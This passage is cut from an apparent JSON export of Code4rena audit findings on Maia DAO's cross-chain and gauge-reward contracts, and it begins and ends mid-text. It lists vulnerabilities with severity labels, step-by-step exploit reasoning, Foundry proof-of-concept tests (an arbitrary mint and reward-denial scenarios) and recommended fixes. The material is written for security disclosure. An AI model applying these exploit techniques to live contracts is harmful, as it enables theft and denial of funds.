                   PARAMS_TKN_START + PARAMS_AMT_OFFSET * uint16(numOfAssets)                                 + PARAMS_ENTRY_SIZE * uint16(PARAMS_START + i)                     ]                 )             );              deposits[i] = uint256(                 bytes32(                     _dParams[                         PARAMS_TKN_START + PARAMS_DEPOSIT_OFFSET * uint16(numOfAssets) + (PARAMS_ENTRY_SIZE * uint16(i)):                             PARAMS_TKN_START + PARAMS_DEPOSIT_OFFSET * uint16(numOfAssets)                                 + PARAMS_ENTRY_SIZE * uint16(PARAMS_START + i)                     ]                 )             );              unchecked {                 ++i;             }         }         //Save Deposit Multiple Params         dParams = DepositMultipleParams({             numberOfAssets: numOfAssets,             depositNonce: nonce,             hTokens: hTokens,             tokens: tokens,             amounts: amounts,             deposits: deposits,             toChain: toChain         });          RootBridgeAgent(payable(msg.sender)).bridgeInMultiple(_recipient, dParams, _fromChain);     } ```  Subsequently `bridgeInMultiple(...)` is called in `RootBridgeAgent.sol`, where `bridgeIn(...)` is called for every set of `hToken`, `token`, `amount` & `deposit` - one iteration in the attack scenario.   `bridgeIn(...)` now performs the critical `checkParams` from the `CheckParamsLib` library where if only 1 of 3 conditions is `true` we will have a revert.   The first check is revert if `_dParams.amount < _dParams.deposit` - this is `false` since `amount` & `deposit` are equal to the `uint256` cast of the `bytes` packing of the malicious address payload.  The second check is:  ``` (_dParams.amount > 0 && !IPort(_localPortAddress).isLocalToken(_dParams.hToken, _fromChain)) ```  Here it\u2019s true `amount > 0` , however, `_dParams.hToken` is the first entry `hTokens[0]` of the attack vector\u2019s `hTokens[]` array, therefore, it is a valid address & `isLocalToken(\u2026)` will return `true` and will be negated by `!` which will make the statement `false` because of `&&`, therefore, it is bypassed.  The third check is:  ``` (_dParams.deposit > 0 && !IPort(_localPortAddress).isUnderlyingToken(_dParams.token, _fromChain)) ```  here it\u2019s true `deposit > 0` , however, `_dParams.token` is the second entry `hTokens[1]` of the attack vector\u2019s `hTokens[]` array, therefore, it is a valid underlying address & `isUnderlyingToken(\u2026)` will return `true` and will be negated by `!` which will make the statement `false` because of `&&`, therefore, it is bypassed.  Whole `checkParams(\u2026)`  ```solidity function checkParams(address _localPortAddress, DepositParams memory _dParams, uint24 _fromChain)         internal         view         returns (bool)     {         if (             (_dParams.amount < _dParams.deposit) //Deposit can't be greater than amount.                 || (_dParams.amount > 0 && !IPort(_localPortAddress).isLocalToken(_dParams.hToken, _fromChain)) //Check local exists.                 || (_dParams.deposit > 0 && !IPort(_localPortAddress).isUnderlyingToken(_dParams.token, _fromChain)) //Check underlying exists.         ) {             return false;         }         return true;     } ```  Now back to `bridgeIn(...)` in RootBridgeAgent we get the `globalAddress` for `_dParams.hToken` (again this is the valid `hToken[0]` address from Branch Chain) and `bridgeToRoot(...)` is called that resides in `RootPort.sol`.   ```solidity   //Get global address     address globalAddress = IPort(localPortAddress).getGlobalTokenFromLocal(_dParams.hToken, _fromChain);      //Check if valid asset     if (globalAddress == address(0)) revert InvalidInputParams();      //Move hTokens from Branch to Root + Mint Sufficient hTokens to match new port deposit     IPort(localPortAddress).bridgeToRoot(_recipient, globalAddress, _dParams.amount, _dParams.deposit, _fromChain); ```  `bridgeToRoot(...)` will check if the `globalAddress` is valid and it is since we got it from the valid `hTokens[0]` entry in the constructed attack. Then `_amount - _deposit = 0` , therefore, no tokens will be transferred and finally the critical line `if (_deposit > 0) mint(_recipient, _hToken, _deposit, _fromChainId)` here `_deposit` is the malicious address payload that was packed to bytes and then unpacked and cast to `uint256` & `_hToken` is the global address that we got from `hTokens[0]` back in the unpacking, therefore whatever the value of the `uint256` representation of the malicious address is will be minted to the attacker.  ### Coded PoC  Copy the two functions `testArbitraryMint` & `_prepareAttackVector` in `test/ulysses-omnichain/RootTest.t.sol`  and place them in the `RootTest` contract after the setup.   Execute with `forge test --match-test testArbitraryMint -vv`   Result - 800000000 minted tokens for free in attacker\u2019s Virtual Account   ```solidity function testArbitraryMint() public {                  // setup function used by developers to add local/global tokens in the system         testAddLocalTokenArbitrum();          // set attacker addre"}, {"title": "Re-adding a deprecated gauge in a new epoch before calling updatePeriod()  / queueRewardsForCycle() will leave some gauges without rewards.", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/639", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-13"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L174-L181 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L407-L422 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/rewards/rewards/FlywheelGaugeRewards.sol#L72-L104   # Vulnerability details  ## Impact  One or more gauge will remain without rewards. Malicious user can DOS a selected gauge from receiving rewards.  ## Proof of Concept  When a gauge is deprecated its weight is subtracted from `totalWeight` , however, the weight of the gauge itself could remain different from 0 (it\u2019s up to the users to remove their votes). That\u2019s reflected in `_addGauge()`.   ```solidity function _addGauge(address gauge) internal returns (uint112 weight) {         // some code ...           // Check if some previous weight exists and re-add to the total. Gauge and user weights are preserved.         weight = _getGaugeWeight[gauge].currentWeight;         if (weight > 0) {             _writeGaugeWeight(_totalWeight, _add112, weight, currentCycle);         }          emit AddGauge(gauge);     } ```  When `addGauge(...)` is invoked to re-add a gauge that was previously deprecated and still contains votes - `_writeGaugeWeight(...)` is called to add the gauge\u2019s weight to `totalWeight` . When the write operation to `totalWeight` is performed during a new cycle but before `updatePeriod` or `queueRewardsForCycle()` are called we will have   `totalWeight.storedWeight = currentWeight (the weight before update)` ,  `totalWeight.currentWeight = newWeight (the new weight)` &   `totalWeight.currentCycle = cycle (the updated new cycle)`   The problem is that when now `queueRewardsForCycle()` is called and subsequently in the call chain `calculateGaugeAllocation(...)` is called which in turn will request the `totalWeight` through `_getStoredWeight(_totalWeight, currentCycle)` we will read the old `totalWeight` i.e `totalWeight.storedWeight` because `totalWeight.currentCycle < currentCycle` is false, because the cycle was already updated during the `addGauge(...)` call.   ```solidity function _getStoredWeight(Weight storage gaugeWeight, uint32 currentCycle) internal view returns (uint112) {         return gaugeWeight.currentCycle < currentCycle ? gaugeWeight.currentWeight : gaugeWeight.storedWeight;     } ```  This will now cause a wrong calculation of the rewards since we have 1 extra gauge but the value of `totalWeight` is less than what it is in reality. Therefore the sum of the rewards among the gauges for the cycle will be more than the total sum allocated by the minter. In other words the function in the code snippet below will be called for every gauge including the re-added but `total` is less than what it has to be.   ```solidity function calculateGaugeAllocation(address gauge, uint256 quantity) external view returns (uint256) {         if (_deprecatedGauges.contains(gauge)) return 0;         uint32 currentCycle = _getGaugeCycleEnd();          uint112 total = _getStoredWeight(_totalWeight, currentCycle);         uint112 weight = _getStoredWeight(_getGaugeWeight[gauge], currentCycle);         return (quantity * weight) / total;     } ```  This can now cause several areas of concern. First, in the presented scenario where a gauge is re-added with weight > 0 before`queueRewardsForCycle(...)`, the last gauge (or perhaps the last few gauges, depends on the distribution of weight) among the active gauges that calls `getAccruedRewards()` won\u2019t receive awards since there will be less rewards than what\u2019s recorded in the gauge state. Second, in a scenario where we might have several gauges with a \u201cwhale\u201d gauge that holds a majority of votes and therefore will have a large amount of rewards, a malicious actor can monitor for when a some gauge is re-added and frontrun `getAccruedRewards()` ,potentially through `newEpoch()` in `BaseV2Gauge` , for all gauges, except the \u201cwhale\u201d, and achieving a DOS where the \u201cwhale\u201d gauge won\u2019t receive the rewards for the epoch and therefore the reputation of it will be damaged. This can be done for any gauge, but will have more significant impact in the case where a lot of voters are denied their awards.  ### Coded PoC  ### Scenario 1  Initialy there are 2 gauges with 75%/25% split of the votes. The gauge with 25% of the votes is removed for 1 cycle and then re-added during a new cycle but before queuing of the rewards. The 25% gauge withdraws its rewards and the 75% gauge is bricked and can\u2019t withdraw rewards.  Copy the functions `testInitialGauge` & `testDeprecatedAddedGauge` & `helper_gauge_state` in `/test/rewards/rewards/FlywheelGaugeRewardsTest.t.sol`  Add `import \"lib/forge-std/src/console.sol\";` to the imports  Execute with `forge test --match-test testDeprecatedAddedGauge -vv`  Result - gauge 2 will revert after trying to collect rewards after the 3rd cycle, since gauge 1 was readded before queuing rewards.   ```solidity function testInitialGauge() public {         uint256 amount_rewards;                  // rewards is 100e18          // add 2 gauges, 25%/75% split         gaugeToken.addGauge(gauge1);         gaugeToken.addGauge(gauge2);         gaugeToken.incrementGauge(gauge1, 1e18);         gaugeToken.incrementGauge(gauge2, 3e18);                  console.log(\"--------------Initial gauge state--------------\");         helper_gauge_state();          // do one normal cycle of rewards         hevm.warp(block.timestamp + 1000);         amount_rewards = rewards.queueRewardsForCycle();                  console.log(\"--------------After 1st queueRewardsForCycle state--------------\");         console.log('nextCycleQueuedRewards', amount_rewards);         helper_gauge_state();                  // collect awards         hevm.prank(gauge1);         rewards.getAccruedRewards();         hevm.prank(gauge2);         rewards.getAccruedRewards();          console.log(\"--------------After getAccruedRewards state--------------\");         helper_gauge_state();     }      function testDeprecatedAddedGauge() public {         uint256 amount_rewards;         // setup + 1 normal cycle         testInitialGauge();         // remove gauge         gaugeToken.removeGauge(gauge1);          // do one more normal cycle with only 1 gauge         hevm.warp(block.timestamp + 1000);         amount_rewards = rewards.queueRewardsForCycle();         console.log(\"--------------After 2nd queueRewardsForCycle state--------------\");         console.log('nextCycleQueuedRewards', amount_rewards);         // examine state         helper_gauge_state();          hevm.prank(gauge2);         rewards.getAccruedRewards();         console.log(\"--------------After getAccruedRewards state--------------\");         // examine state         helper_gauge_state();          // A new epoch can start for 1 more cycle         hevm.warp(block.timestamp + 1000);                  // Add the gauge back, but before rewards are queued         gaugeToken.addGauge(gauge1);         amount_rewards = rewards.queueRewardsForCycle();          console.log(\"--------------After 3rd queueRewardsForCycle state--------------\");         // examine state         console.log('nextCycleQueuedRewards', amount_rewards);         helper_gauge_state();          // this is fine         hevm.prank(gauge1);         rewards.getAccruedRewards();          // this reverts         hevm.prank(gauge2);         rewards.getAccruedRewards();          console.log(\"--------------After getAccruedRewards state--------------\");         // examine state         helper_gauge_state();      } function helper_gauge_state() public view {         console.log('FlywheelRewards balance', rewardToken.balanceOf(address(rewards)));         console.log('gaugeCycle', rewards.gaugeCycle());         address[] memory gs = gaugeToken.gauges();         for(uint i=0; i<gs.length; i++) {             console.log('-------------');             (uint112 prior1, uint112 stored1, uint32 cycle1) = rewards.gaugeQueuedRewards(ERC20(gs[i]));             console.log(\"Gauge \",i+1);             console.log(\"priorRewards\",prior1);             console.log(\"cycleRewards\",stored1);              console.log(\"storedCycle\",cycle1);         }         console.log('-------------');     } ```  ### Scenario 2  Initialy there are 4 gauges with (2e18 | 2e18 | 6e18 | 4e18) votes respectively. The gauge with 4e18 votes is removed for 1 cycle and then re-added during a new cycle but before queuing of the rewards. The 6e18 gauge withdraws its rewards and the 4e18 gauge withdraws its rewards, the two gauges with 2e18 votes are bricked and can\u2019t withdraw rewards.  Copy the functions `testInitialGauge2` & `testDeprecatedAddedGauge2` & `helper_gauge_state` in `/test/rewards/rewards/FlywheelGaugeRewardsTest.t.sol`  Execute with `forge test --match-test testDeprecatedAddedGauge2 -vv`  Result -  2 gauges with 2e18 votes will revert after trying to collect rewards.  ```solidity function testInitialGauge2() public {         uint256 amount_rewards;                  // rewards is 100e18                  // add 4 gauges, 2x/2x/6x/4x split         gaugeToken.addGauge(gauge1);         gaugeToken.addGauge(gauge2);         gaugeToken.addGauge(gauge3);         gaugeToken.addGauge(gauge4);          gaugeToken.incrementGauge(gauge1, 2e18);         gaugeToken.incrementGauge(gauge2, 2e18);         gaugeToken.incrementGauge(gauge3, 6e18);         gaugeToken.incrementGauge(gauge4, 4e18);                   console.log(\"--------------Initial gauge state--------------\");         helper_gauge_state();          // do one normal cycle of rewards         hevm.warp(block.timestamp + 1000);         amount_rewards = rewards.queueRewardsForCycle();                  console.log(\"--------------After 1st queueRewardsForCycle state--------------\");         console.log('nextCycleQueuedRewards', amount_rewards);         helper_gauge_state();                  // collect awards         hevm.prank(gauge1);         rewards.getAccruedRewards();         hevm.prank(gauge2);         rewards.getAccruedRewards();         hevm.prank(gauge3);         rewards.getAccruedRewards();         hevm.prank(gauge4);         rewards.getAccruedRewards();          console.log(\"--------------After getAccruedRewards state--------------\");         helper_gauge_state();     }     function testDeprecatedAddedGauge2() public {         uint256 amount_rewards;         // setup + 1 normal cycle         testInitialGauge2();         // remove gauge         gaugeToken.removeGauge(gauge4);          // do one more normal cycle with only 3 gauges         hevm.warp(block.timestamp + 1000);         amount_rewards = rewards.queueRewardsForCycle();         console.log(\"--------------After 2nd queueRewardsForCycle state--------------\");         console.log('nextCycleQueuedRewards', amount_rewards);         // examine state         helper_gauge_state();          hevm.prank(gauge1);         rewards.getAccruedRewards();         hevm.prank(gauge2);         rewards.getAccruedRewards();         hevm.prank(gauge3);         rewards.getAccruedRewards();         console.log(\"--------------After getAccruedRewards state--------------\");         // examine state         helper_gauge_state();          // A new epoch can start for 1 more cycle         hevm.warp(block.timestamp + 1000);                  // Add the gauge back, but before rewards are queued         gaugeToken.addGauge(gauge4);         amount_rewards = rewards.queueRewardsForCycle();          console.log(\"--------------After 3rd queueRewardsForCycle state--------------\");         console.log('nextCycleQueuedRewards', amount_rewards);         // examine state         helper_gauge_state();          // this is fine         hevm.prank(gauge3);         rewards.getAccruedRewards();                  // this is fine         hevm.prank(gauge4);         rewards.getAccruedRewards();          // this reverts         hevm.prank(gauge1);         rewards.getAccruedRewards();                  // this reverts, same weight as gauge 1         hevm.prank(gauge2);         rewards.getAccruedRewards();          console.log(\"--------------After getAccruedRewards state--------------\");         // examine state         helper_gauge_state();      } function helper_gauge_state() public view {         console.log('FlywheelRewards balance', rewardToken.balanceOf(address(rewards)));         console.log('gaugeCycle', rewards.gaugeCycle());         address[] memory gs = gaugeToken.gauges();         for(uint i=0; i<gs.length; i++) {             console.log('-------------');             (uint112 prior1, uint112 stored1, uint32 cycle1) = rewards.gaugeQueuedRewards(ERC20(gs[i]));             console.log(\"Gauge \",i+1);             console.log(\"priorRewards\",prior1);             console.log(\"cycleRewards\",stored1);              console.log(\"storedCycle\",cycle1);         }         console.log('-------------');     } ```  ### Tools Used  Manual inspection  ### Recommendation  When a new cycle starts make sure gaguges are re-added after rewards are queued in a cycle.   ## Assessed type  Timing"}, {"title": "BoostAggregator owner can set fees to 100% and steal all of the users' rewards", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/634", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-14"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/boost-aggregator/BoostAggregator.sol#L119 https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/boost-aggregator/BoostAggregator.sol#L153   # Vulnerability details  ## Impact Users who use `BoostAggregator` will suffer 100% loss of their rewards.  ## Proof of Concept After users have staked their tokens, the owner of the `BoostAggregator` can set `protocolFee` to 10 000 (100%) and steal of the users' rewards. Anyone can create their own `BoostAggregator` and it is supposed to be publicly used, therefore the owner of it cannot be considered trusted. Allowing the owner to steal users' rewards is an unnecessary vulnerability.  ```solidity     function setProtocolFee(uint256 _protocolFee) external onlyOwner {          if (_protocolFee > DIVISIONER) revert FeeTooHigh();         protocolFee = _protocolFee; // @audit - owner can set it to 100% and steal all rewards     } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Create a mapping which tracks the `protocolFee` at which the user has deposited their NFT, upon withdrawing get the protocolFee from the said mapping.   ## Assessed type  Other"}, {"title": "User underpay for the remote call execution gas on root chain", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/612", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-14"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L836 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1066 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1032 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L811   # Vulnerability details  ## Impact User underpay for the remote call execution gas, meaning Incorrect **minExecCost** that being deposited at `_replenishGas` call inside `_payExecutionGas` function.  ## Proof of Concept *Multi chain contracts - anycall v7 lines* https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Upgradeable.sol#L265  https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Upgradeable.sol#L167  https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Upgradeable.sol#L276  *ulysses-omnichain contract lines* https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L811  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L851  The user is paying incorrect minimum execution cost for Anycall Mutlichain [L820](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L820), the value of `minExecCost` is calculated incorrectly. AnycallV7 protocol considers a premium fee `_feeData.premium` on top of the TX gas price which is not considered here.  let's get into the flow from the start, the `anyExec` call that being called by the executer [L265](https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Upgradeable.sol#L265) when an anycall request comes from a source chain includes `chargeDestFee` modifier ```Solidity     function anyExec(         address _to,         bytes calldata _data,         string calldata _appID,         RequestContext calldata _ctx,         bytes calldata _extdata     )         external         virtual         lock         whenNotPaused         chargeDestFee(_to, _ctx.flags)         onlyMPC     {         IAnycallConfig(config).checkExec(_appID, _ctx.from, _to); ```  now, chargeDestFee modifier will call `chargeFeeOnDestChain` function as well at  [L167](https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Upgradeable.sol#L167)  ```Solidity /// @dev Charge an account for execution costs on this chain /// @param _from The account to charge for execution costs     modifier chargeDestFee(address _from, uint256 _flags) {         if (_isSet(_flags, AnycallFlags.FLAG_PAY_FEE_ON_DEST)) {             uint256 _prevGasLeft = gasleft();             _;             IAnycallConfig(config).chargeFeeOnDestChain(_from, _prevGasLeft);         } else {             _;         }     } ```  as you see [L198-L210](https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Config.sol#L198C1-L210), inside chargeFeeOnDestChain function is including`_feeData.premium` for the execution cost `totalCost`. ```Solidity function chargeFeeOnDestChain(address _from, uint256 _prevGasLeft)         external         onlyAnycallContract     {         if (!_isSet(mode, FREE_MODE)) {             uint256 gasUsed = _prevGasLeft + EXECUTION_OVERHEAD - gasleft();             uint256 totalCost = gasUsed * (tx.gasprice + _feeData.premium);             uint256 budget = executionBudget[_from];             require(budget > totalCost, \"no enough budget\");             executionBudget[_from] = budget - totalCost;             _feeData.accruedFees += uint128(totalCost);         }     } ```   The conclusion: `minExecCost`  calculation doesn't include `_feeData.premium` at [L811](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L811) according to multichain AnycallV7 protocol.  You should include `_feeData.premium` as well in `minExecCost`  same as [L204](https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Config.sol#L204)  ``` uint256 totalCost = gasUsed * (tx.gasprice + _feeData.premium); ```   Note: This also applicable on: _payFallbackGas() in RootBridgeAgent at [L836](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L836)  _payFallbackGas() in BranchBridgeAgent at [L1066](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1066) _payExecutionGas in BranchBridgeAgent at [L1032](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1032)    ## Tools Used Manual Review  ## Recommended Mitigation Steps add `_feeData.premium` to `minExecCost`  at  `_payExecutionGas` function [L811](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L811)  you need to get _feeData.premium first from AnycallV7Config by premium() function at [L286-L288](https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Config.sol#L286-L288) ``` uint256 minExecCost = (tx.gasprice  + _feeData.premium) * (MIN_EXECUTION_OVERHEAD + _initialGas - gasleft()));  ```    ## Assessed type  Other"}, {"title": "The difference between gasLeft and gasAfterTransfer is greater than TRANSFER_OVERHEAD causing `anyExecute` to fail always", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/610", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-15"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1029-L1054   # Vulnerability details  ## Impact In `_payExecutionGas` ,  there is the following code:  ```solidity ///Save gas left  uint256 gasLeft = gasleft();  .  .  .   . //Transfer gas remaining to recipient  SafeTransferLib.safeTransferETH(_recipient, gasRemaining - minExecCost);  //Save Gas  uint256 gasAfterTransfer = gasleft();  //Check if sufficient balance  if (gasLeft - gasAfterTransfer > TRANSFER_OVERHEAD) {   _forceRevert();   return;  } ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1029-L1054  It checks if the difference between gasLeft and gasAfterTransfer is greater than TRANSFER_OVERHEAD then it calls _forceRevert(). So that Anycall Executor reverts the call. This check has been Introduced to prevent any arbitrary code executed in the  _recipient's fallback (This was confirmed by the sponsor). However, the condition `gasLeft - gasAfterTransfer > TRANSFER_OVERHEAD` is always true. TRANSFER_OVERHEAD is 24_000 ```solidity uint256 internal constant TRANSFER_OVERHEAD = 24_000; ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L139  And the **gas spent between gasLeft and gasAfterTransfer is nearly 70_000 which is higher than 24_000**. Thus, causing the function to revert always.  `_payExecutionGas` is called by `anyExecute` which is called by Anycall Executor. This means `anyExecute` will also fail. This happens because gasLeft value is stored before even replenishing gas and not before transfer.  ## Proof of Concept  #### Overview This PoC is independent from the codebase (but uses the same code). There are one contract simulating `BranchBridgeAgent.anyExecute`.  We run the test, then anyExecute will revert because gasLeft - gasAfterTransfer is always greater than TRANSFER_OVERHEAD (24_000).  Here is the output of the test:  ```sh [PASS] test_anyexecute_always_revert_bc_transfer_overhead() (gas: 124174) Logs:   (gasLeft - gasAfterTransfer > TRANSFER_OVERHEAD) => true   gasLeft - gasAfterTransfer = 999999999999979606 - 999999999999909238 = 70368  Test result: ok. 1 passed; 0 failed; finished in 1.88ms ```  #### Explanation   `BranchBridgeAgent.anyExecute` method depends on the following external calls: 1. `AnycallExecutor.context()` 2. `AnycallProxy.config()` 3. `AnycallConfig.executionBudget()` 4. `AnycallConfig.withdraw()` 5. `AnycallConfig.deposit()` 6. `WETH9.withdraw()`  For this reason, I've copied the same code from [multichain-smart-contracts](https://github.com/anyswap/multichain-smart-contracts). For WETH9, I've used the contract from the codebase which has minimal code.  Please note that: - **tx.gasprice** is replaced with a fixed value in `_payExecutionGas` method as it is not available in Foundry. - In `_replenishGas`, reading the config via `IAnycallProxy(localAnyCallAddress).config()` is replaced with Immediate call for simplicity. In other words, avoiding proxy to make the PoC simpler and shorter. However, if done with proxy the gas used would increase. So in both ways, it is in favor of the PoC. - In `_forceRevert`, we call anycallConfig Immediately skippping the returned value from AnycallProxy. This is anyway irrelevant for this PoC.  ####  The coded PoC   - Foundry.toml ```sh  [profile.default]  solc = '0.8.17'  src = 'solidity'  test = 'solidity/test'  out = 'out'  libs = ['lib']  fuzz_runs = 1000  optimizer_runs = 10_000 ```  - .gitmodules ```sh  [submodule \"lib/ds-test\"]   path = lib/ds-test   url = https://github.com/dapphub/ds-test   branch = master  [submodule \"lib/forge-std\"]   path = lib/forge-std   url = https://github.com/brockelmore/forge-std   branch = master ```  - remappings.txt ```sh  ds-test/=lib/ds-test/src  forge-std/=lib/forge-std/src ```  - Test File ```solidity // PoC => Maia OmniChain: anyExecute always revert in BranchBridgeAgent pragma solidity >=0.8.4 <0.9.0;  import {Test} from \"forge-std/Test.sol\"; import \"forge-std/console.sol\";  import {DSTest} from \"ds-test/test.sol\";  library SafeTransferLib {     /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/     /*                       CUSTOM ERRORS                        */     /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/      /// @dev The ETH transfer has failed.     error ETHTransferFailed();      /// @dev The ERC20 `transferFrom` has failed.     error TransferFromFailed();      /// @dev The ERC20 `transfer` has failed.     error TransferFailed();      /// @dev The ERC20 `approve` has failed.     error ApproveFailed();      /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/     /*                         CONSTANTS                          */     /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/      /// @dev Suggested gas stipend for contract receiving ETH     /// that disallows any storage writes.     uint256 internal constant _GAS_STIPEND_NO_STORAGE_WRITES = 2300;      /// @dev Suggested gas stipend for contract receiving ETH to perform a few     /// storage reads and writes, but low enough to prevent griefing.     /// Multiply by a small constant (e.g. 2), if needed.     uint256 internal constant _GAS_STIPEND_NO_GRIEF = 100000;      /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/     /*                       ETH OPERATIONS                       */     /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/      /// @dev Sends `amount` (in wei) ETH to `to`.     /// Reverts upon failure.     ///     /// Note: This implementation does NOT protect against gas griefing.     /// Please use `forceSafeTransferETH` for gas griefing protection.     function safeTransferETH(address to, uint256 amount) internal {         /// @solidity memory-safe-assembly         assembly {             // Transfer the ETH and check if it succeeded or not.             if iszero(call(gas(), to, amount, 0, 0, 0, 0)) {                 // Store the function selector of `ETHTransferFailed()`.                 mstore(0x00, 0xb12d13eb)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }         }     }      /// @dev Force sends `amount` (in wei) ETH to `to`, with a `gasStipend`.     /// The `gasStipend` can be set to a low enough value to prevent     /// storage writes or gas griefing.     ///     /// If sending via the normal procedure fails, force sends the ETH by     /// creating a temporary contract which uses `SELFDESTRUCT` to force send the ETH.     ///     /// Reverts if the current contract has insufficient balance.     function forceSafeTransferETH(         address to,         uint256 amount,         uint256 gasStipend     ) internal {         /// @solidity memory-safe-assembly         assembly {             // If insufficient balance, revert.             if lt(selfbalance(), amount) {                 // Store the function selector of `ETHTransferFailed()`.                 mstore(0x00, 0xb12d13eb)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }             // Transfer the ETH and check if it succeeded or not.             if iszero(call(gasStipend, to, amount, 0, 0, 0, 0)) {                 mstore(0x00, to) // Store the address in scratch space.                 mstore8(0x0b, 0x73) // Opcode `PUSH20`.                 mstore8(0x20, 0xff) // Opcode `SELFDESTRUCT`.                 // We can directly use `SELFDESTRUCT` in the contract creation.                 // Compatible with `SENDALL`: https://eips.ethereum.org/EIPS/eip-4758                 if iszero(create(amount, 0x0b, 0x16)) {                     // To coerce gas estimation to provide enough gas for the `create` above.                     if iszero(gt(gas(), 1000000)) {                         revert(0, 0)                     }                 }             }         }     }      /// @dev Force sends `amount` (in wei) ETH to `to`, with a gas stipend     /// equal to `_GAS_STIPEND_NO_GRIEF`. This gas stipend is a reasonable default     /// for 99% of cases and can be overridden with the three-argument version of this     /// function if necessary.     ///     /// If sending via the normal procedure fails, force sends the ETH by     /// creating a temporary 